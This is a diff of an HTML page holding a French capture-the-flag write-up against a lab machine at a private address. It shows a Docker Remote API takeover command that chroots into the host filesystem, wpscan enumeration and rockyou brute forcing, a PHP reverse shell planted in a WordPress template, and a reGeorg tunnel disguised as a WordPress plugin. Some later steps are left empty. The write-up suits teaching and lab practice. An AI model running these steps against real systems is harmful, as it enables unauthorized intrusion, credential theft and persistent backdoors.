@@ -131,13 +131,13 @@
 
 
             <pre><code class="language-bash mt-5">
-                sudo nmap -sV -sC -O -T5 -p- -oN discover.txt 192.168.56.104
-                
-                # -sV  -> Récupère la version des services
-                # -sC  -> Utilise les scripts nmap nse (utilisés pour détecter des vulnérabilités sur les ports)
-                # -O   -> Détection de l'OS
-                # -p-  -> Test tous les ports
-                # -oN  -> Écrit le résultat dans output.txt
+sudo nmap -sV -sC -O -T5 -p- -oN discover.txt 192.168.56.104
+
+# -sV  -> Récupère la version des services
+# -sC  -> Utilise les scripts nmap nse (utilisés pour détecter des vulnérabilités sur les ports)
+# -O   -> Détection de l'OS
+# -p-  -> Test tous les ports
+# -oN  -> Écrit le résultat dans output.txt
                 </code></pre>
 
             <p class="mt-5">! le port 2375 est ouvert que pour le mode esay ! </p>
@@ -183,16 +183,17 @@
                 <h3 style="color: red;">Le port 2375:</h3>
 
                 <ul>
-                    <li >Rôle:</li>
+                    <li class="li-title"><strong>Rôle:</strong></li>
                     <ul>
                         <li>Docker expose une API appelée *Docker Remote API* qui permet de contôler le daemon Docker a
-                            <strong>DISTANCE</strong></li>
+                            <strong>DISTANCE</strong>
+                        </li>
                     </ul>
-                    <li><strong>Protocole:</strong></li>
+                    <li class="li-title"><strong>Protocole:</strong></li>
                     <ul>
                         <li>Fonctionne avec TCP</li>
                     </ul>
-                    <li><strong>Risque spécifique:</strong></li>
+                    <li class="li-title"><strong>Risque spécifique:</strong></li>
                     <ul>
                         <li>Un attaquant qui accède à ce port peut envoyer des commandes Docker via l’api pour
                             récupéré des informations sur se que fait tourner le service docker de l’hôte
@@ -202,6 +203,211 @@
             </fieldset>
         </section>
 
+        <section class="mt-5">
+            <h2 class="mt-5">Etape 3: Docker Recon (Optionnel → Mode easy)</h2>
+
+            <p class="para">Je vais donc utilisé cette API Docker pour pouvoir récupérer des information sur le docker (
+                on peut récupéré le flag final avec cette commande
+                <span style="color: red;">
+                    docker -H tcp://192.168.56.104:2375 run --rm -it -v
+                    /:/host wordpress chroot /host bash
+                </span>
+
+                que pour le mode easy mais je l’utilise ce port pour comprendre
+                toute l’infra Docker qui tourne )
+            </p>
+
+            <pre><code class="language-bash"> 
+┌──(kali㉿kali)-[~]
+└─$ docker -H tcp://192.168.56.104:2375 image ls
+            </code></pre>
+
+            <fieldset>
+                <legend><i class="bi bi-lightbulb-fill" style="color: yellow;"></i></legend>
+                <p class="para">
+                    <span style="color: green;">-H / - -host</span> → Spécifie l’hôte où le client docker doit se
+                    connecter<br><br>
+
+                    <span style="color: green;">tcp://192.168.56.104:2375</span> → Définie l’@IP de l’hôte avec le n° de
+                    port<br><br>
+
+                    <span style="color: green;">image ls</span> → Commande Docker qui liste les images disponible sur
+                    l’hôte
+                </p>
+            </fieldset>
+            <p class="para">-> Résultat: (étape complète sur mon <a href="https://github.com/lenzzair/Write-Up">github
+                    )</a> </p>
+
+            <table class="table table-dark mt-5">
+                <thead>
+                    <tr>
+                        <th scope="col">REPOSITORY</th>
+                        <th scope="col">TAG</th>
+                        <th scope="col">IMAGE ID</th>
+                        <th scope="col">COMMENTAIRE</th>
+
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <th>wordpress</th>
+                        <th>latest</th>
+                        <th>c4260b289fc7</th>
+                        <th>Hébèrege un service wordpress, lié avec le port 8000 apache ouvert </th>
+
+                    </tr>
+                    <tr>
+                        <th>mysql</th>
+                        <th>5.7</th>
+                        <th>c73c7527c03a</th>
+                        <th></th>
+                    </tr>
+                    <tr>
+                        <th>jeroenpeeters/docker-ssh</th>
+                        <th>latest</th>
+                        <th>7d3ecb48134e</th>
+                        <th>Cette syntaxt de réposite est liée a un conteneur sur DockerHub</th>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3 class="mt-5">Schéma de l'infra Docker qui tourne sur la machine cible</h3>
+
+            <img src="./img/infra_docker_vd.png" class="img-fluid">
+        </section>
+
+        <section class="mt-5">
+            <h2 class="my-5">Etape 3 :Scan wpscan sur le service wordpress</h2>
+
+            <pre class="mt-5"><code class="language-bash">
+wpscan  --url http://192.168.56.104:8000 -e u,p
+            </code></pre>
+
+            <ul>
+                <li class="li-title">-e</li>
+                <ul>
+                    <li>u <i class="bi bi-arrow-right"></i> Énumère les utilisateurs WordPress</li>
+                    <li>p <i class="bi bi-arrow-right"></i> Enumère les plugins installés pour vérifier leur présence et
+                        détecter ceux qui pourraient être vulnérable</li>
+
+                </ul>
+            </ul>
+
+            <img src="./img/result_wp_vd.png" class="img-fluid" alt="Resultat du scan wordpress">
+
+            <fieldset>
+                <legend><i class="bi bi-lightbulb-fill" style="color: yellow;"></i></legend>
+                <p>Wpscan nous trouve un utilisateur = bob
+
+                    prochaine étape: wpscan peut aussi brute force les mots de passe d’utilisateur définie</p>
+            </fieldset>
+
+            <pre class="mt-5"><code class="language-bash">
+wpscan --url http://192.168.56.104:8000 -U bob -P /usr/share/wordlist/rockyou.txt
+            </code></pre>
+
+            <p class="para">Et nous obtenons le login /mdp</p>
+
+            <fieldset>
+                <legend><i class="bi bi-check-lg" style="color: green;"></i></legend>
+                <span class="li-title"><strong>bob / Welcom1</strong></span>
+            </fieldset>
+
+            <p class="para">Nous voila sur la page admin du WordPress et nous obtenons nôtre premier flag ( easy )
+
+                <span style="color: red;">flag_1{2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998}</span>
+            </p>
+
+
+        </section>
+
+        <section>
+            <h2>Etape 5 : Injecter une backdoor dans le wordpress</h2>
+
+            <p class="para">Pour sa nous allons modifier le code
+                <? php ?> dans la sidebarre →Appearance→Editor→404Template par une un reverse shell php file qu’on
+                récupère sur github
+            </p>
+
+            <img src="./img/inject_php_vd.png" class="img-fluid" alt="image injection reverse shell wp">
+            <p class="my-5">Nous avons plus qu’a écouter sur le port 4444 et lance la page où est upload le reverse
+                shell</p>
+            <img src="./img/shell_nc_vd.png" class="img-fluid" alt="resultat nc listening">
+
+            <fieldset>
+                <legend><i class="bi bi-exclamation-triangle" style="color: yellow;"></i></legend>
+                <p class="mx-5">Au final on retrouve rien d’intéressant sur le conteneur wordpress ( le shell est utile
+                    si on utilise protfwd avec metasploit ) </p>
+            </fieldset>
+        </section>
+
+        <section class="etape4">
+            <h2 class="my-5">Etape 4 : Tunneling and cross protocole </h2>
+
+            <ol>
+                <li>Récupéré le projet Regeorg sur github</li>
+                <ul>
+                    <li>
+                        <pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ git clone https://github.com/sensepost/reGeorg.git</code></pre>
+                    </li>
+                </ul>
+                <li>Prépare la charge utile</li>
+                <ul>
+                    <li>Création d’un fichier d’en-tête WordPress puis on rajoute le scipt tunnel de regeorg</li>
+                    <li>
+                        <pre><code class="language-bash">
+─$ cat <<-'EOF' >tunnel/head.php
+<?php
+/*
+* Plugin Name: tunnel
+* Version: 1.0.00
+* Author: Anonymous
+* Author URI: http://anonymous.com
+* License: GPL2
+*/
+?>
+
+EOF
+                
+$ cat tunnel/tunnel.php >> tunnel/head.php
+$ mv tunnel/head.php tunnel.php
+$ zip -r -9 tunnel.zip tunnel
+                            
+                            </code></pre>
+                    </li>
+                </ul>
+                <li>On ajoute notre charge en tant que plugin wordpress </li>
+                <ul>
+                    <li><img src="./img/wp_plugin_vd.png" class="img-fluid my-5" alt="img plugin"></li>
+                    <li><img src="./img/activation_plugin_vd.png" class="img-fluid" alt="activation plugin"></li>
+                </ul>
+                <li>Lancer le script regeorg et activation du proxy local</li>
+                <ul>
+                    <li>
+                        <pre><code class="language-bash">python2 /home/kali/reGeorg/reGeorgSocksProxy.py -l 127.0.0.1 -p 8087 -u http://192.168.56.104:8000/wp-content/plugins/tunnel/tunnel.php -v DEBUG</code></pre>
+                    </li>
+                </ul>
+                <li><strong>Fonctionnement du tunnel avec le protocole SOCKS5</strong></li>
+                <ol>
+                    <li class="li-title"><strong>Etape 1:</strong>
+                        <ul>
+                            <li>Générer une trame ssh avec comme IP Dest celle du conteneur cible qui nous est pas
+                                accessible de base, et l’envoyer a nôtre proxy qui est lier a nôtre tunnel.php</li>
+                        </ul>
+                    </li>
+                    <li class="li-title"><strong>Etape 2 :</strong></li>
+                    <ul>
+                        <li></li>
+                    </ul>
+                    <li class="li-title"><strong>Etape 3 :</strong></li>
+                    <li class="li-title"><strong>Etape 4 :</strong></li>
+                    <li class="li-title"><strong>Etape 5 :</strong></li>
+                </ol>
+
+            </ol>
+        </section>
     </div>
+
 
 </body>
